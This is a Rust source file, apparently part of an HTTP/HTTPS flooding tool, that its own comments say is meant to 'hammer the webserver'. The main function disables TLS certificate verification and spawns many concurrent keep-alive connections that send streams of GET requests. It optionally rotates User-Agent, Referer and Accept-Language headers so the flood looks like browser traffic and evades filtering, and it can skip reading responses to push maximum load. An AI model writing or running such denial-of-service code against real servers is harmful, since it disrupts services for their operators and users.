/// High Performance HTTP/HTTPS Engine
/// It's not polite like hyper or reqwest
/// Call one of these in the connect.rs and hammer the webserver :wink:

use tokio::net::TcpSocket;
use tokio::io::{AsyncWriteExt, AsyncReadExt, AsyncRead, AsyncWrite};
use tokio::io::AsyncBufReadExt;

trait AsyncReadWrite: AsyncRead + AsyncWrite {}
impl<T: AsyncRead + AsyncWrite + ?Sized> AsyncReadWrite for T {}
use tokio::task;
use tokio_rustls::TlsConnector;
use rustls::{ClientConfig, RootCertStore, pki_types::ServerName};
use rustls::client::danger::{ServerCertVerifier, ServerCertVerified, HandshakeSignatureValid};
use rustls::pki_types::{CertificateDer, UnixTime};
use rustls::DigitallySignedStruct;
use std::sync::Arc;
use rand::prelude::*;  


use crate::libs::logs::print;


// Bloody imports for that http task thing
use std::sync::Mutex;
use tokio::task::JoinHandle;
use once_cell::sync::Lazy;

#[derive(Debug)]
struct NoCertificateVerification;

impl ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA1,
            rustls::SignatureScheme::ECDSA_SHA1_Legacy,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
            rustls::SignatureScheme::ED448,
        ]
    }


}



pub static HTTP_TASK_HANDLES: Lazy<Mutex<Vec<JoinHandle<()>>>> = Lazy::new(|| Mutex::new(Vec::new()));

// Add this function to read a single HTTP response from the stream
async fn read_http_response<R: AsyncRead + Unpin>(
    reader: &mut tokio::io::BufReader<R>,
) -> Result<(), std::io::Error> {
    let mut line = String::new();
    // Read status line
    reader.read_line(&mut line).await?;
    // Read headers
    let mut content_length = None;
    loop {
        line.clear();
        reader.read_line(&mut line).await?;
        if line.trim().is_empty() {
            break;
        }
        if line.to_lowercase().starts_with("content-length:") {
            if let Some(len_str) = line.split(':').nth(1) {
                content_length = len_str.trim().parse::<usize>().ok();
            }
        }
    }
    // Read body if Content-Length is known
    if let Some(len) = content_length {
        let mut buf = vec![0; len];
        reader.read_exact(&mut buf).await?;
    }
    Ok(())
}



pub fn hammer_http_max_load(
    host: &str,
    port: u16,
    num_requests: usize,
    drain_response: bool,
    use_tls: bool,
    random_headers: bool,
    concurrency: usize,
) {
    let host = host.to_string();

    // TLS config skipping is "danjerous"
    // But who are we to judge?
    let root_store = RootCertStore::empty();
    let mut cfg = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();
    
    // Use the dangerous API to skip certificate verification
    cfg.dangerous()
        .set_certificate_verifier(Arc::new(NoCertificateVerification));
    
    let tls_config = Arc::new(cfg);
    let connector = Arc::new(TlsConnector::from(tls_config));

    let user_agents = vec![
        // Chrome (Windows, Mac, Linux, Android, iOS)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/117.0.0.0 Mobile/15E148 Safari/604.1",

        // Firefox (Windows, Mac, Linux, Android)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0",

        // Safari (Mac, iOS)
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",

        // Edge (Windows)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31",

        // Opera (Windows, Mac)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.4928.34",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.4928.34",
    ];

    let referers = vec![
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.instagram.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.youtube.com/",
        "https://www.amazon.com/",
    ];

    let accept_languages = vec![
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "en-CA,en;q=0.9",
        "en-AU,en;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
    ];

    
    let concurrency = concurrency;
    let requests_per_task = num_requests / concurrency;

    for _ in 0..concurrency {
        let host_clone = host.clone();
        let connector = connector.clone();
        let random_headers = random_headers;
        let user_agents = user_agents.clone();
        let referers = referers.clone();
        let accept_languages = accept_languages.clone();

        let handle = task::spawn(async move {
            if let Ok(mut addrs) = tokio::net::lookup_host((host_clone.as_str(), port)).await {
                if let Some(addr) = addrs.next() {
                    let socket = match TcpSocket::new_v4() {
                        Ok(s) => s,
                        Err(_) => {
                            eprintln!("Failed to create TcpSocket for {}:{}", host_clone, port);
                            return;
                        }
                    };

                    let buf_size = 1 * 1024 * 1024;
                    let _ = socket.set_recv_buffer_size(buf_size);
                    let _ = socket.set_send_buffer_size(buf_size);
                    let _ = socket.set_nodelay(true);

                    let stream = match socket.connect(addr).await {
                        Ok(s) => s,
                        Err(_) => {
                            eprintln!("Failed to connect to {}:{}", host_clone, port);
                            print(&format!("Failed to connect to {}:{}", host_clone, port), true);
                            return;
                        }
                    };

                    let domain_owned = host_clone.clone();
                    let mut stream: Box<dyn AsyncReadWrite + Unpin + Send> = if use_tls {
                        let domain_str = domain_owned.clone();
                        let domain = match ServerName::try_from(domain_owned) {
                            Ok(d) => d,
                            Err(_) => {
                               // eprintln!("Invalid domain: {}", domain_str);
                                print(&format!("Invalid domain: {}", domain_str), true);
                                return;
                            }
                        };
                        match connector.connect(domain, stream).await {
                            Ok(s) => Box::new(s),
                            Err(_) => {
                              //  eprintln!("TLS connection failed for {}", domain_str);
                                print(&format!("TLS connection failed for {}", domain_str), true);
                                return;
                            }
                        }
                    } else {
                        Box::new(stream)
                    };

                    let (mut reader, mut writer) = tokio::io::split(stream);

                    let mut buf_reader = tokio::io::BufReader::new(&mut reader);

                    for _ in 0..requests_per_task {
                        let mut request = format!(
                            "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n",
                            host_clone
                        );

                        if random_headers {
                            let mut rng = rand::thread_rng();
                            let user_agent = user_agents.choose(&mut rng).unwrap();
                            let referer = referers.choose(&mut rng).unwrap();
                            let accept_language = accept_languages.choose(&mut rng).unwrap();

                            request.push_str(&format!("User-Agent: {}\r\n", user_agent));
                            request.push_str(&format!("Referer: {}\r\n", referer));
                            request.push_str(&format!("Accept-Language: {}\r\n", accept_language));
                            request.push_str("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n");
                        }

                        request.push_str("\r\n");

                        if let Err(_) = writer.write_all(request.as_bytes()).await {
                            eprintln!("Failed to send request");
                            return;
                        }

                        if drain_response {
                            if let Err(_) = read_http_response(&mut buf_reader).await {
                                eprintln!("Failed to read response");
                                return;
                            }
                        }
                    }
                }
            }
        });
        HTTP_TASK_HANDLES.lock().unwrap().push(handle);
    }
}


pub fn abort_all_http_tasks() {
    let mut handles = HTTP_TASK_HANDLES.lock().unwrap();
    for handle in handles.drain(..) {
        handle.abort();
    }
}


/*

pub fn hammer_http(host: &str, port: u16, num_requests: usize) {
    hammer_http_max_load(host, port, num_requests, true, false, false, 1000);
}

pub fn hammer_https(host: &str, port: u16, num_requests: usize) {
    hammer_http_max_load(host, port, num_requests, true, true, false, 1000);
}

pub fn hammer_http_no_drain(host: &str, port: u16, num_requests: usize) {
    hammer_http_max_load(host, port, num_requests, false, false, false  );
}

pub fn hammer_https_no_drain(host: &str, port: u16, num_requests: usize) {
    hammer_http_max_load(host, port, num_requests, false, true, false);
}
    */